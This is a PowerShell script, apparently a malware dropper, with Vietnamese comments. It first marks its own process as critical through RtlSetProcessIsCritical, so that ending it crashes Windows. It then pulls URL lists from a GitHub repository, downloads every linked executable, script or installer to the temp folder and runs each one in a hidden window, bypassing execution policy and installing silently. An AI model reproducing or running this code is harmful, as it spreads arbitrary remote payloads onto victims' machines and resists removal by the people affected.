function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# 1. Cấu hình danh sách nguồn
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

# Các định dạng hỗ trợ (All Extensions)
$exts = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"

Write-Host "--- MODE: CHILL & STABLE ---" -ForegroundColor Yellow

# 2. Thu thập và lọc trùng URL
$allUrls = @()
foreach ($s in $sources) {
    try {
        Write-Host "[*] Dang doc list: $s" -ForegroundColor Gray
        $data = (New-Object System.Net.WebClient).DownloadString($s)
        $allUrls += $data -split "`r?`n"
    } catch { 
        Write-Host "[!] Khong the ket noi: $s" -ForegroundColor Red 
    }
}

# Lọc sạch sẽ: Bỏ trống, bỏ trùng, đúng đuôi file
$finalList = $allUrls | ForEach-Object { $_.Trim() } | Where-Object { 
    $u = $_
    $u -ne "" -and ($exts | Where-Object { $u.ToLower().EndsWith($_) })
} | Select-Object -Unique

Write-Host "[+] Tim thay $($finalList.Count) link duy nhat. Bat dau xu ly tu tu..." -ForegroundColor Green
Write-Host "----------------------------------------------------------"

# 3. Vòng lặp xử lý tuần tự
$count = 1
foreach ($url in $finalList) {
    try {
        # Lấy tên file từ URL (bỏ qua các tham số sau dấu ?)
        $cleanUrl = $url.Split('?')[0]
        $fileName = [System.IO.Path]::GetFileName($cleanUrl)
        if (-not $fileName) { $fileName = "file_$count.exe" }
        
        $path = Join-Path $env:TEMP $fileName
        $ext = [System.IO.Path]::GetExtension($path).ToLower()

        Write-Host "[$count/$($finalList.Count)] Dang tai: $fileName..." -NoNewline
        
        # Tải file
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $path)
        Write-Host " [OK]" -ForegroundColor Green

        # Thực thi ẩn dựa trên loại file
        if ($ext -eq ".ps1") {
            Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
        }
        elseif (".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $ext) {
            Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden
        }
        elseif ($ext -eq ".msi" -or $ext -eq ".msp") {
            Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden
        }
        else {
            # .exe, .bat, .cmd, .com, .scr...
            Start-Process -FilePath $path -WindowStyle Hidden
        }
    } catch {
        Write-Host " [LOI]" -ForegroundColor Red
    }
    $count++

}

Write-Host "----------------------------------------------------------"
Write-Host "[DONE] Tat ca da duoc xu ly xong!" -ForegroundColor Cyan
